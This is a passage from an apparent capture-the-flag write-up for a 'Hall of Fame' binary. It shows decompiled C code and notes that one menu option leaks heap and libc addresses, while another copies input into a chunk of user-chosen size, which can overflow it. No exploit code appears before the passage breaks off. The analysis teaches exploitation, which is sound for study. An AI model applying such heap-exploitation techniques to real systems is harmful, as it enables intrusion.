</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">83
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">main</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> iVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>pcVar2;
</span></span><span style="display:flex;"><span>  size_t sVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> counter;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> o;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>pty;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>heap_pointer;
</span></span><span style="display:flex;"><span>  ulong size;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>ptr;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>chunk;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> option [<span style="color:#f60">3</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> score [<span style="color:#f60">64</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> word [<span style="color:#f60">100</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  counter <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  heap_pointer <span style="color:#555">=</span> sbrk(<span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>  setup_IO();
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">while</span>( <span style="color:#366">true</span> ) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">while</span>( <span style="color:#366">true</span> ) {
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">do</span> {
</span></span><span style="display:flex;"><span>        print_statements(counter);
</span></span><span style="display:flex;"><span>        printf(<span style="color:#c30">&#34;Choose&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>        fflush(stdout);
</span></span><span style="display:flex;"><span>        pcVar2 <span style="color:#555">=</span> fgets(option,<span style="color:#f60">3</span>,stdin);
</span></span><span style="display:flex;"><span>      } <span style="color:#069;font-weight:bold">while</span> (pcVar2 <span style="color:#555">==</span> (<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>);
</span></span><span style="display:flex;"><span>      fflush(stdin);
</span></span><span style="display:flex;"><span>      sVar3 <span style="color:#555">=</span> strcspn(option,<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>      option[sVar3] <span style="color:#555">=</span> <span style="color:#c30">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>      iVar1 <span style="color:#555">=</span> atoi(option);
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">!=</span> <span style="color:#f60">2</span>) <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>      printf(<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">The position of latest addition is at %p</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,heap_pointer);
</span></span><span style="display:flex;"><span>      printf(<span style="color:#c30">&#34;The position of PUTS is at %p</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,puts);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">==</span> <span style="color:#f60">3</span>) <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">==</span> <span style="color:#f60">1</span>) {
</span></span><span style="display:flex;"><span>      printf(<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">How many points did this person score? &gt; &#34;</span>);
</span></span><span style="display:flex;"><span>      fflush(stdout);
</span></span><span style="display:flex;"><span>      pcVar2 <span style="color:#555">=</span> fgets(score,<span style="color:#f60">0x40</span>,stdin);
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (pcVar2 <span style="color:#555">!=</span> (<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>        fflush(stdin);
</span></span><span style="display:flex;"><span>        sVar3 <span style="color:#555">=</span> strcspn(score,<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>        score[sVar3] <span style="color:#555">=</span> <span style="color:#c30">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>        size <span style="color:#555">=</span> strtol(score,<span style="color:#555">&amp;</span>pty,<span style="color:#f60">10</span>);
</span></span><span style="display:flex;"><span>        ptr <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)malloc(size);
</span></span><span style="display:flex;"><span>        chunk <span style="color:#555">=</span> ptr;
</span></span><span style="display:flex;"><span>        printf(<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">Who is this Hall of Famer &gt; &#34;</span>);
</span></span><span style="display:flex;"><span>        fflush(stdout);
</span></span><span style="display:flex;"><span>        fgets(word,<span style="color:#f60">100</span>,stdin);
</span></span><span style="display:flex;"><span>        fflush(stdin);
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)chunk <span style="color:#555">=</span> word._0_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">8</span>) <span style="color:#555">=</span> word._8_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x10</span>) <span style="color:#555">=</span> word._16_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x18</span>) <span style="color:#555">=</span> word._24_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x20</span>) <span style="color:#555">=</span> word._32_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x28</span>) <span style="color:#555">=</span> word._40_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x30</span>) <span style="color:#555">=</span> word._48_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x38</span>) <span style="color:#555">=</span> word._56_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x40</span>) <span style="color:#555">=</span> word._64_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x48</span>) <span style="color:#555">=</span> word._72_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x50</span>) <span style="color:#555">=</span> word._80_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x58</span>) <span style="color:#555">=</span> word._88_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined4 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x60</span>) <span style="color:#555">=</span> word._96_4_;
</span></span><span style="display:flex;"><span>        heap_pointer <span style="color:#555">=</span> ptr;
</span></span><span style="display:flex;"><span>        counter <span style="color:#555">=</span> counter <span style="color:#555">+</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>      puts(<span style="color:#c30">&#34;No choice Given!&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Exiting software...&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">==</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>  __stack_chk_fail();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>print_statements</strong></p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">print_statements</span>(<span style="color:#078;font-weight:bold">int</span> counter)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Welcome to the Hall of Fame!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;Number of Hall Of Famers: %d</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,(ulong)(uint)counter);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;What brings you in here?</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;1) Add Hall of Famer</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">2) View Position</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">3) Exit&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the binary will call <code>print_statements</code> first to print the menu, where we can add, view and exit. Let&rsquo;s take a look on the main method one-by-one:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">do</span> {
</span></span><span style="display:flex;"><span>        print_statements(counter);
</span></span><span style="display:flex;"><span>        printf(<span style="color:#c30">&#34;Choose&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>        fflush(stdout);
</span></span><span style="display:flex;"><span>        pcVar2 <span style="color:#555">=</span> fgets(option,<span style="color:#f60">3</span>,stdin);
</span></span><span style="display:flex;"><span>      } <span style="color:#069;font-weight:bold">while</span> (pcVar2 <span style="color:#555">==</span> (<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>);
</span></span><span style="display:flex;"><span>      fflush(stdin);
</span></span><span style="display:flex;"><span>      sVar3 <span style="color:#555">=</span> strcspn(option,<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>      option[sVar3] <span style="color:#555">=</span> <span style="color:#c30">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>      iVar1 <span style="color:#555">=</span> atoi(option);
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">!=</span> <span style="color:#f60">2</span>) <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>      printf(<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">The position of latest addition is at %p</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,heap_pointer);
</span></span><span style="display:flex;"><span>      printf(<span style="color:#c30">&#34;The position of PUTS is at %p</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,puts);
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so the second menu turn out gave us a leak of the PUTS libc address and the heap address. This help us a lot, as we don&rsquo;t need to leak the libc address at all.</p>
<p>Now, let&rsquo;s check the first menu:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">==</span> <span style="color:#f60">1</span>) {
</span></span><span style="display:flex;"><span>      printf(<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">How many points did this person score? &gt; &#34;</span>);
</span></span><span style="display:flex;"><span>      fflush(stdout);
</span></span><span style="display:flex;"><span>      pcVar2 <span style="color:#555">=</span> fgets(score,<span style="color:#f60">0x40</span>,stdin);
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (pcVar2 <span style="color:#555">!=</span> (<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>        fflush(stdin);
